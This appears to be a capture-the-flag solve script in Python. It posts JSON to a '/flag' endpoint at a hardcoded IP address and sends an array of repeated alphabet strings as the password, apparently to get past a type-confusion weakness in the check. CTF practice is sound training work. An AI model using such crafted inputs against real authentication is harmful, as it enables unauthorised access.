import json
import requests

url = "http://34.146.80.178:8001/flag"

data = {"pass":["abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"]*32}
headers = {"Content-Type":"application/json"}
response = requests.post(url, data=json.dumps(data), headers=headers)
print(response.text)